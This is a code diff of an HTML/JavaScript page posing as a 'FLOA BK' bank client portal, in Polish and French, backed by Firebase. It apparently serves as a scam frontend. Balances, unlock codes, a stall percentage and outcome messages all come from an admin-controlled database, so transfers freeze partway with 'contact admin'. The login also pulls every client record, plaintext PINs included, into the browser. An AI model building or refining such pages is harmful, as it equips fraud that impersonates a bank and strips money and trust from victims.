@@ -3,106 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>FLOA BK - Aplikacja</title>
+<title>FLOA BK</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-:root{--p:#6A0DAD;--l:#F3E8FF;--bg:#F9FAFB;--w:#fff;--t:#111827;--m:#6b7280;--b:#e5e7eb;--g:#166534}
-*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;margin:0;padding:0}
-body{background:var(--bg);font-size:14px}
+:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280}
+*{box-sizing:border-box;font-family:system-ui,Arial,sans-serif}
+body{margin:0;background:var(--bg)}
 .screen{display:none;min-height:100vh}.screen.active{display:block}
-.btn{width:100%;padding:13px;background:var(--p);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer}
-.btn:hover{opacity:.95}
-.input{width:100%;padding:11px 13px;border:1px solid #D1D5DB;border-radius:8px;font-size:14px}
-.input:focus{outline:2px solid var(--l);border-color:var(--p)}
-header{background:#fff;padding:13px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--b)}
-.logo{display:flex;gap:7px;align-items:center;font-size:20px;font-weight:800;color:var(--p);letter-spacing:0.5px}
-.badge{width:34px;height:34px;border-radius:50%;background:var(--l);display:flex;align-items:center;justify-content:center;font-weight:600;color:var(--p);font-size:13px;cursor:pointer}
-nav{position:fixed;bottom:0;left:0;right:0;background:var(--p);display:grid;grid-template-columns:repeat(4,1fr);padding:9px 0 5px}
-.nav{color:#fff;font-size:10px;opacity:.75;text-align:center}.nav.active{opacity:1}.nav i{font-size:17px;margin-bottom:2px}
-.card{background:#fff;border-radius:12px;padding:18px;margin-bottom:14px;box-shadow:0 1px 2px rgba(0,0,0,.05);border:1px solid var(--b)}
-.hidden{display:none!important}
+.btn{width:100%;padding:14px;background:var(--p);color:#fff;border:0;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
+.input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:8px;font-size:15px}
+.card{background:#fff;border:1px solid var(--b);border-radius:12px;padding:20px;margin:16px;box-shadow:0 2px 6px rgba(0,0,0,.05)}
+header{background:#fff;padding:14px 18px;border-bottom:1px solid var(--b);font-weight:800;font-size:20px;color:var(--p);letter-spacing:1px}
 </style>
 </head>
 <body>
 
 <!-- LOGIN -->
 <section id="login" class="screen active">
-  <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px;background:#f3f4f6">
-    <div style="background:#fff;border-radius:12px;padding:26px;width:100%;max-width:340px;box-shadow:0 4px 12px rgba(0,0,0,.08)">
-      <div style="width:72px;height:72px;border-radius:50%;background:var(--p);display:flex;align-items:center;justify-content:center;margin:0 auto 16px">
-        <span style="color:#fff;font-size:22px;font-weight:800;letter-spacing:1px">FB</span>
-      </div>
-      <h1 style="text-align:center;font-size:24px;font-weight:800;margin-bottom:6px;letter-spacing:1px;color:var(--p)">FLOA BK</h1>
-      <p style="text-align:center;font-size:12px;color:var(--m);margin-bottom:16px">Strefa klienta</p>
-      <label style="font-size:11px;color:var(--m)">Email</label>
-      <input id="email" type="email" class="input" style="margin-bottom:10px" placeholder="nom@gmail.com">
-      <label style="font-size:11px;color:var(--m)">PIN</label>
-      <input id="pin" type="password" maxlength="6" class="input" style="margin-bottom:14px;border:2px solid var(--p)" placeholder="••••••">
-      <button class="btn" id="loginBtn">Zaloguj się <i class="fa-solid fa-arrow-right"></i></button>
-      <p id="err" class="hidden" style="color:#dc2626;margin-top:8px;font-size:12px;text-align:center">Accès refusé - compte non autorisé</p>
-    </div>
-  </div>
+<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px">
+<div style="background:#fff;padding:30px;border-radius:14px;width:100%;max-width:360px;box-shadow:0 4px 14px rgba(0,0,0,.08)">
+<div style="width:80px;height:80px;background:var(--p);border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:800">FB</div>
+<h1 style="text-align:center;font-size:32px;color:var(--p);margin:0 0 4px;letter-spacing:1.5px">FLOA BK</h1>
+<p style="text-align:center;color:var(--m);margin:0 0 22px;font-size:13px">Strefa klienta</p>
+<input id="email" class="input" type="email" placeholder="Email" style="margin-bottom:10px">
+<input id="pin" class="input" type="password" placeholder="PIN (6 chiffres)" maxlength="6" style="margin-bottom:14px;border:2px solid var(--p)">
+<button class="btn" id="loginBtn">Zaloguj się</button>
+<p id="status" style="text-align:center;font-size:12px;color:var(--m);margin-top:10px">Connexion Firebase...</p>
+<p id="err" style="display:none;color:#dc2626;text-align:center;margin-top:8px;font-size:13px"></p>
+</div></div>
 </section>
 
 <!-- DASHBOARD -->
-<section id="dashboard" class="screen">
-  <header><div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div><div style="display:flex;gap:8px"><div class="badge"><i class="fa-regular fa-bell"></i></div><div class="badge" id="avatar">U</div></div></header>
-  <main style="padding:18px 16px 80px">
-    <h2 id="greet" style="font-size:14px;font-weight:500;margin-bottom:12px">Witaj</h2>
-    <div class="card">
-      <p style="color:var(--m);font-size:12px;margin-bottom:4px">Dostępne saldo <i class="fa-solid fa-circle-check" style="color:var(--p)"></i></p>
-      <p id="bal" style="font-size:28px;font-weight:700;margin-bottom:8px">0,00 zł</p>
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px">
-        <button style="padding:9px;border:1px solid var(--b);border-radius:8px;background:#fff;font-size:12px" onclick="toast('IBAN')"><i class="fa-regular fa-credit-card"></i> IBAN</button>
-        <button style="padding:9px;border:1px solid var(--b);border-radius:8px;background:#fff;font-size:12px" onclick="showScreen('transfer')"><i class="fa-solid fa-arrow-up-right-from-square"></i> Przelew</button>
-      </div>
-    </div>
-  </main>
-  <nav><div class="nav active"><i class="fa-solid fa-house"></i><br>Portfel</div><div class="nav" onclick="showScreen('transfer')"><i class="fa-solid fa-qrcode"></i><br>Pay</div><div class="nav"><i class="fa-regular fa-credit-card"></i><br>Karta</div><div class="nav"><i class="fa-regular fa-user"></i><br>Konto</div></nav>
+<section id="dash" class="screen">
+<header>FLOA BK</header>
+<div class="card">
+<div style="color:var(--m);font-size:13px">Witaj, <b id="name"></b></div>
+<div style="font-size:32px;font-weight:700;margin:8px 0" id="bal">0 zł</div>
+<button class="btn" onclick="go('transfer')">Wykonaj przelew</button>
+</div>
 </section>
 
 <!-- TRANSFER -->
 <section id="transfer" class="screen">
-  <header><div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div></header>
-  <main style="padding:18px 16px 80px">
-    <h1 style="font-size:17px;margin-bottom:12px">Wykonaj przelew</h1>
-    <div class="card">
-      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:8px"><span>Saldo:</span><b id="bal2">0 zł</b></div>
-      <input id="amt" class="input" placeholder="Kwota" style="margin-bottom:8px">
-      <input id="ben" class="input" placeholder="Beneficjent" style="margin-bottom:8px">
-      <input id="iban" class="input" placeholder="IBAN" style="margin-bottom:8px">
-      <input id="bic" class="input" placeholder="BIC" style="margin-bottom:8px">
-      <input id="bank" class="input" placeholder="Bank" style="margin-bottom:8px">
-      <input id="reason" class="input" placeholder="Powód" style="margin-bottom:12px">
-      <button class="btn" id="toVerifyBtn">Kontynuuj</button>
-    </div>
-  </main>
+<header>FLOA BK</header>
+<div class="card">
+<input id="amt" class="input" placeholder="Kwota" style="margin-bottom:10px">
+<input id="ben" class="input" placeholder="Beneficjent" style="margin-bottom:10px">
+<input id="iban" class="input" placeholder="IBAN" style="margin-bottom:14px">
+<button class="btn" onclick="go('verify')">Dalej</button>
+</div>
 </section>
 
 <!-- VERIFY -->
 <section id="verify" class="screen">
-  <header><div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div></header>
-  <main style="padding:18px 16px 80px">
-    <div class="card">
-      <p style="font-size:13px">Kwota: <b id="vAmt"></b></p>
-      <p style="font-size:12px;color:var(--m)">Wprowadź kod z panelu admin</p>
-    </div>
-    <div class="card">
-      <input id="code" class="input" placeholder="Kod aktywacyjny" style="margin-bottom:10px">
-      <button class="btn" id="confirmBtn">Potwierdź</button>
-      <div id="prog" class="hidden" style="margin-top:12px">
-        <div style="background:#eee;height:7px;border-radius:4px;overflow:hidden"><div id="bar" style="height:7px;background:var(--p);width:0%"></div></div>
-        <p id="ptxt" style="font-size:11px;margin-top:5px;color:var(--m)"></p>
-      </div>
-    </div>
-  </main>
+<header>FLOA BK</header>
+<div class="card">
+<p style="margin-bottom:8px">Kwota: <b id="vamt"></b></p>
+<input id="code" class="input" placeholder="Kod aktywacyjny" style="margin-bottom:12px">
+<button class="btn" id="okBtn">Potwierdź</button>
+<div id="prog" style="display:none;margin-top:14px">
+<div style="background:#eee;height:8px;border-radius:4px"><div id="bar" style="height:8px;background:var(--p);width:0%"></div></div>
+<p id="ptxt" style="font-size:12px;margin-top:6px;color:var(--m)"></p>
+</div>
+</div>
 </section>
-
-<div id="toast" style="position:fixed;bottom:75px;left:50%;transform:translateX(-50%);background:#111827;color:#fff;padding:8px 14px;border-radius:7px;display:none;font-size:12px;z-index:100"></div>
 
 <script type="module">
 import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-import {getDatabase, ref, query, orderByChild, equalTo, get} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+import {getDatabase,ref,get} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
@@ -116,67 +84,43 @@ const firebaseConfig = {
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
-let currentUser = null;
+let user = null;
 
-const $ = id => document.getElementById(id);
-const showScreen = id => { document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); $(id).classList.add('active'); };
-window.showScreen = showScreen;
-const toast = m => { const t=$('toast'); t.textContent=m; t.style.display='block'; setTimeout(()=>t.style.display='none',1800); };
-window.toast = toast;
-const fmt = n => new Intl.NumberFormat('pl-PL').format(Number(n)||0)+' zł';
+const $ = i => document.getElementById(i);
+const go = id => {document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));$(id).classList.add('active')};
+window.go = go;
+const fmt = n => new Intl.NumberFormat('pl-PL').format(Number(n)||0) + ' zł';
+
+// Test connexion
+get(ref(db,'clients')).then(()=>{$('status').textContent='Firebase connecté ✓';$('status').style.color='green'}).catch(()=>{$('status').textContent='Erreur connexion Firebase';$('status').style.color='red'});
 
 $('loginBtn').onclick = async () => {
   const email = $('email').value.trim().toLowerCase();
   const pin = $('pin').value.trim();
-  $('err').classList.add('hidden');
+  $('err').style.display='none';
+  if(!email||!pin){$('err').textContent='Entre email et PIN';$('err').style.display='block';return}
+  $('loginBtn').textContent='Connexion...'; $('loginBtn').disabled=true;
   try{
-    const q = query(ref(db,'clients'), orderByChild('email'), equalTo(email));
-    const snap = await get(q);
-    if(!snap.exists()) throw new Error('no');
+    const snap = await get(ref(db,'clients'));
+    const data = snap.val()||{};
     let found = null;
-    snap.forEach(child => { const v = child.val(); if(v.pin === pin) found = {id: child.key,...v}; });
-    if(!found) throw new Error('bad');
-    currentUser = found;
-    $('greet').textContent = 'Witaj, ' + currentUser.nom;
-    $('bal').textContent = fmt(currentUser.montant);
-    $('bal2').textContent = fmt(currentUser.montant);
-    $('avatar').textContent = currentUser.nom.split(' ').map(w=>w[0]).join('').substring(0,2).toUpperCase();
-    showScreen('dashboard');
-  }catch(e){
-    $('err').classList.remove('hidden');
-  }
+    for(const id in data){const v=data[id]; if(v.email && v.email.toLowerCase()===email && v.pin===pin){found={id,...v};break}}
+    if(!found){$('err').textContent='Compte introuvable ou PIN faux - crée-le dans ADMIN';$('err').style.display='block';$('loginBtn').textContent='Zaloguj się';$('loginBtn').disabled=false;return}
+    user = found;
+    $('name').textContent = user.nom;
+    $('bal').textContent = fmt(user.montant);
+    go('dash');
+  }catch(e){$('err').textContent='Erreur Firebase: '+e.message;$('err').style.display='block'}
+  $('loginBtn').textContent='Zaloguj się';$('loginBtn').disabled=false;
 };
 
-$('toVerifyBtn').onclick = () => {
-  $('vAmt').textContent = ($('amt').value || '0') + ' zł';
-  showScreen('verify');
-};
+document.querySelector('#transfer .btn').onclick = ()=>{$('vamt').textContent=($('amt').value||'0')+' zł';go('verify')};
 
-$('confirmBtn').onclick = () => {
-  if(!currentUser) return;
-  const code = $('code').value.trim();
-  if(code!== currentUser.code){ toast('Kod nieprawidłowy'); return; }
-  const pct = Number(currentUser.pct) || 100;
-  $('prog').classList.remove('hidden');
-  let w = 0;
-  const bar = $('bar'), ptxt = $('ptxt');
-  const int = setInterval(()=>{
-    w += 3;
-    const cur = Math.min(w, pct);
-    bar.style.width = cur + '%';
-    ptxt.textContent = 'Przetwarzanie... ' + cur + '%';
-    if(w >= pct){
-      clearInterval(int);
-      if(pct < 100){
-        ptxt.textContent = 'Virement arrêté à ' + pct + '% - contact admin';
-        ptxt.style.color = '#dc2626';
-      }else{
-        ptxt.textContent = currentUser.msg || 'Przelew zatwierdzony ✓';
-        ptxt.style.color = '#166534';
-        setTimeout(()=>showScreen('dashboard'), 1200);
-      }
-    }
-  }, 30);
+$('okBtn').onclick = ()=>{
+  if($('code').value.trim()!==user.code){alert('Kod błędny');return}
+  const pct = Number(user.pct)||100;
+  $('prog').style.display='block'; let w=0;
+  const int=setInterval(()=>{w+=2;const cur=Math.min(w,pct);$('bar').style.width=cur+'%';$('ptxt').textContent=cur+'%';if(w>=pct){clearInterval(int);$('ptxt').textContent=pct<100?'Virement arrêté à '+pct+'%':user.msg||'Przelew zatwierdzony ✓';setTimeout(()=>go('dash'),1500)}},30);
 };
 </script>
 </body>
